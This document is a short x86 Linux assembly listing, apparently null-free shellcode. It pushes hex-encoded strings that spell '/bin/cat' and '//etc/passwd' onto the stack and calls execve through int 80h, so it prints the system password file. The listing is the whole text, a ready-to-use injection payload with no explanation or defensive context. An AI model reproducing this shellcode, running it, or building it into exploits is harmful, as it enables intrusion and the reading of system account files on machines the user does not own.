section .text
global _start
 
_start:
xor eax,eax
   cdq
   push edx
   push word 0x7461
   push word 0x632f
   push word 0x6e69
   push word 0x622f
   mov ecx,esp
   push edx
   push word 0x6477
   push word 0x7373
   push word 0x6170
   push word 0x2f63
   push dword 0x74652f2f
   mov ebx,esp
   add al, 0xb
   push edx
   push ebx
   push ecx
   mov ebx,esp
   xchg ebx, ecx
   int 80h
